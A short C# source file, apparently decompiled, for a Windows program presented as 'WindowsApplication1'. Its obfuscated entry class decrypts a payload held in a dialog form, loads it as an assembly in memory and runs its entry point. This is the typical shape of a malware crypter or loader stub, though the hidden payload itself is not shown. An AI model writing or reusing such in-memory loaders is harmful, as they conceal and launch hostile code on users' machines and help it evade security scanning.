using System;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using WindowsApplication1.My;

namespace WindowsApplication1;

[StandardModule]
internal sealed class 怎文十文三谢达
{
	[STAThread]
	public static void main(string[] args)
	{
		object[] parameters = new object[0];
		Assembly assembly = AppDomain.CurrentDomain.Load(MyProject.Forms.Dialog1_0.Decrypted());
		if (assembly.EntryPoint!.GetParameters().Length > 0)
		{
			parameters = new object[1] { args };
		}
		assembly.EntryPoint!.Invoke(null, parameters);
	}
}
